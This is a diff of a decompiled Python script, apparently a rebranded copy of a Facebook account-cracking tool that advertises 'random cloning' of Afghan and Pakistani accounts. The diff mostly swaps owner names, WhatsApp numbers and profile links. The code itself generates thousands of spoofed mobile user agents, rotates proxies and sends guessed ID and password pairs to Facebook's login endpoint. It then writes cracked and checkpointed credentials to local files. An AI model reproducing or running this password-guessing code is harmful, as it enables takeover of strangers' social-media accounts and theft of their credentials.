@@ -2,7 +2,7 @@
 # Time Succes decompile : 2023-02-07 00:26:14.084668
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open http://wa.me/+93764034195')
+os.system('xdg-open http://wa.me/+93702856593')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
@@ -16,7 +16,7 @@ except ModuleNotFoundError:
     os.system('python run.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
-os.system('xdg-open https://www.facebook.com/profile.php?id=100074359838041')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402')
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -52,12 +52,12 @@ except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
 	
 prox=open('.prox.txt','r').read().splitlines()
- 
+
 ugen2=[]
 ugen=[]
- 
- 
- 
+
+
+
 for xd in range(5000):
 	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -73,7 +73,7 @@ for xd in range(5000):
 	l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 	ugen.append(uaku2)
- 
+
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
         b=random.choice(['6','7','8','9','10','11','12'])
@@ -89,7 +89,7 @@ for agent in range(10000):
         l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
- 
+
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	b=random.randrange(1, 9)
@@ -104,7 +104,7 @@ for xd in range(10000):
 	k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
 	ugen.append(uaku)
- 
+
 	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	b=random.choice(['6','7','8','9','10','11','12'])
 	c=' en-us; GT-'
@@ -121,25 +121,24 @@ for xd in range(10000):
 	ugen.append(uaku2)
 	
 	
- 
+
 logo=("""
-     **     ******** ** ********
-    ****   //////** /**//////** 
-   **//**       **  /**     **  
-  **  //**     **   /**    **   
- **********   **    /**   **    
-/**//////**  **     /**  **     
-/**     /** ********/** ********
-//      // //////// // //////// 
+  .########...######..##.....##
+.##.....##.##....##.##.....##
+.##.....##.##.......##.....##
+.########...######..#########
+.##...##.........##.##.....##
+.##....##..##....##.##.....##
+.##.....##..######..##.....##
 \33[1;37m----------------------------------------------
-→   Owner      :  NAZAWALI MAFIA KING 
-→   Facebook   :  AZ JAN NAZAWALI
-→   Github     : AZ NAZAWALI
-  →   Tools   :  RANDOM 
+   \33[1;37mOwner         :  Raziqullah Saadat
+\33[1;37m   Facebook   :  Raziqullah Saadat
+\33[1;37m   Github         : Raziqullah Saadat
+  \33[1;37m Tools           :  RANDOM 
 \x1b[1;97m→   Version    :  0.1
 4G/3G full speed internet 💔Update Coming Soon
 \33[1;37m----------------------------------------------""")
- 
+
 def lines():
 	print('\33[1;37m----------------------------------------------')
  
@@ -162,11 +161,11 @@ def dynamic(text):
     for o in titik:
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
- 
+
 def riaz():
 	os.system('clear')
 	print(logo)
-	print('[1] Random AFG H A N I S T A N CLONING')
+	print('[1] Random AFGHANISTAN CLONING')
 	print('[2] PAKISTAN Random Cloning')
 	print('[3] Follow me on Facebook')
 	print('\x1b[1;91m[5] Exit Main menu')
@@ -177,16 +176,16 @@ def riaz():
 	if riaz1 =='5':
 		riaz()
 	if riaz1 =='4':
-		os.system('xdg-open http://wa.me/+93764034195?text=AZ.JAN💜🐰Sir😪💕')
+		os.system('xdg-open http://wa.me/+93702856593?text=AZ.JAN💜🐰Sir😪💕')
 	if riaz1 =='3':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100074359838041');riaz()
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402');riaz()
 	if riaz1 =='2':
 		bangla()
 	else:
 		print('\n\033[1;31mChoose valid option\033[0;97m')
 		riaz()
- 
- 
+
+
 def annu():
     os.system('clear')
     print(logo)
@@ -220,7 +219,7 @@ def bangla():
 		b2()
 	if riaz1 =='3':
 		riaz()
- 
+
 def m1():
     user=[]
     os.system('clear')
@@ -329,7 +328,7 @@ def m3():
     print(46*'-')
     print('The Process Has Been Complete')
     print('Press Enter to Back');riaz()
- 
+
 def b1():
     user=[]
     os.system('clear')
@@ -402,9 +401,9 @@ def b2():
     print(46*'-')
     print('The Process Has Been Complete')
     print('Press Enter to Back');riaz()
- 
- 
- 
+
+
+
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -443,30 +442,30 @@ def rcrack(uid,pwx,tl):
 			'upgrade-insecure-requests': '1',
 			"sec-fetch-user": "?1",
             'user-agent': pro}
-            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[AZ.NAZAWALI-OK] '+cid+'|'+ps+'\033[0;97m')
-                open('AZ.NAZAWALI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[Saadat-OK] '+cid+'|'+ps+'\033[0;97m')
+                open('Saadat-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[AZ.NAZAWALI-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                print('\033[1;31m[Saadat-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('AZ.NAZAWALI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mAZ.NAZAWALI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mSaadat\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
- 
- 
+
+
 riaz()
